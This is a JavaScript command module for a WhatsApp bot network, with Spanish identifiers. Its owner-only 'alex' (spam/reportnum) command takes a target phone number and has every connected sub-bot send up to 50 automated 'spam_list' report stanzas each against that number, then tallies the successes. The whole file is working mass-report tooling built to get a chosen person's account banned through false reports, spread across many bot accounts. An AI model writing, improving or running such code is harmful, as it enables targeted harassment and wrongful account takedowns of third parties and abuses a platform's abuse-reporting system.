import { getAllSockets } from "../../lib/subbotManager.js";

const OWNERS = ['50578391933', '2599176675473'];
const MIN = 2;
const MAX = 50;
const FLOW = "ContactInfo";
const TO = 15000;

function sacarNumero(jid) {
    return String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');
}

function parsear(raw) {
    let flow = FLOW;
    let porBot = null;
    let numero = null;

    const tieneBarra = raw.includes('|');
    const [left, ...rest] = raw.split('|');
    const right = rest.join(' ');

    const leerFlows = (txt) => txt.split(/\s+/).filter(t => {
        const low = t.toLowerCase();
        if (low === 'menu') { flow = 'MessageMenu'; return false; }
        if (low === 'contacto') { flow = 'ContactInfo'; return false; }
        return true;
    });

    const toksLeft = leerFlows(left).filter(t => t !== '|');
    const numsLeft = toksLeft.filter(t => /^\+?\d+$/.test(t));

    if (tieneBarra) {
        numero = numsLeft.map(t => t.replace(/\D/g, '')).join('');
        const toksRight = leerFlows(right);
        const dig = toksRight.map(t => t.replace(/\D/g, '')).join('');
        if (dig) porBot = +dig;
    } else {
        let lista = numsLeft.slice();
        if (lista.length >= 2 && lista[lista.length - 1].replace(/\D/g, '').length <= 2) {
            porBot = +lista.pop().replace(/\D/g, '');
        }
        numero = lista.map(t => t.replace(/\D/g, '')).join('');
    }

    return { numero: numero || null, porBot, flow };
}

export default {
    nombre: 'alex',
    categoria: 'Owner',
    alias: ['reportnum', 'spam', 'spamnum'],
    descripcion: 'Reporte masivo con todos los bots (Solo Owner)',
    ejecutar: async ({ sock, msg, argumento, responder }) => {
        const sender = msg.key.participant || msg.key.senderPn || msg.key.remoteJid || '';
        const numeroSender = sacarNumero(sender);

        console.log(`[ALEX] Número detectado: ${numeroSender}`);

        if (!OWNERS.includes(numeroSender)) {
            return responder.texto('🔒 Acceso denegado. Solo Owner.');
        }

        const raw = String(argumento || '').trim();
        if (!raw) {
            return responder.texto('❌ Uso: .alex <numero> | <cantidad>\nEjemplo: .alex +50587258309 | 10');
        }

        const { numero, porBot: porBotRaw, flow } = parsear(raw);
        const digNum = (numero || '').replace(/\D/g, '');

        if (!digNum || digNum.length < 8 || digNum.length > 15) {
            return responder.texto(`❌ Número inválido: "${numero}". Debe tener entre 8 y 15 dígitos con código de país.\nEjemplo: .alex +50587258309 | 10`);
        }

        const targetJid = `${digNum}@s.whatsapp.net`;

        const pool = [...new Set([...getAllSockets(), sock])].filter(s => s?.user?.id && s?.ws?.isOpen !== false);
        if (pool.length === 0) return responder.texto('❌ No hay bots conectados.');

        let nota = '';
        let porBot = porBotRaw;
        if (porBot === null || porBot === undefined) porBot = MAX;
        else if (porBot < MIN) { porBot = MIN; nota = ` (mínimo ${MIN})`; }
        else if (porBot > MAX) { porBot = MAX; nota = ` (máximo ${MAX})`; }

        const shuffled = pool.slice().sort(() => Math.random() - 0.5);
        const base = {
            tag: "iq",
            attrs: { to: "s.whatsapp.net", type: "set", xmlns: "spam" },
            content: [{ tag: "spam_list", attrs: { jid: targetJid, spam_flow: flow }, content: [] }]
        };

        await responder.texto(`⏳ Enviando ${shuffled.length * porBot} reportes con ${shuffled.length} bots...`);
        const tareas = [];
        for (const s of shuffled) {
            for (let k = 0; k < porBot; k++) {
                tareas.push(s.query({ ...base, attrs: { ...base.attrs } }, TO));
            }
        }

        const res = await Promise.allSettled(tareas);
        let ok = 0, sinR = 0;
        const fallos = new Map();
        for (const r of res) {
            if (r.status === 'fulfilled') { ok++; continue; }
            const m = r.reason?.message || String(r.reason);
            if (/timeout/i.test(m)) { sinR++; continue; }
            fallos.set(m, (fallos.get(m) || 0) + 1);
        }
        const fail = res.length - ok - sinR;

        let out =
            `📢 *Reporte enviado*\n\n` +
            `> • Número: +${digNum}\n` +
            `> • Bots: ${shuffled.length}\n` +
            `> • Por bot: ${porBot}${nota}\n` +
            `> • Total: ${shuffled.length * porBot}\n` +
            `> • ✅ Exitosos: ${ok}\n` +
            (sinR ? `> • ⏱️ Sin respuesta: ${sinR}\n` : '') +
            (fail ? `> • ❌ Fallidos: ${fail}\n` : '');

        if (fallos.size) {
            out += `\n*Errores:*\n`;
            let i = 0;
            for (const [m, c] of fallos) {
                if (i++ >= 3) break;
                out += `> • ${c}x ${m.slice(0, 80)}\n`;
            }
        }

        console.log(`[ALEX] ${shuffled.length} bots x${porBot} → ${targetJid} ok=${ok} sinR=${sinR} fail=${fail}`);
        return responder.texto(out);
    }
};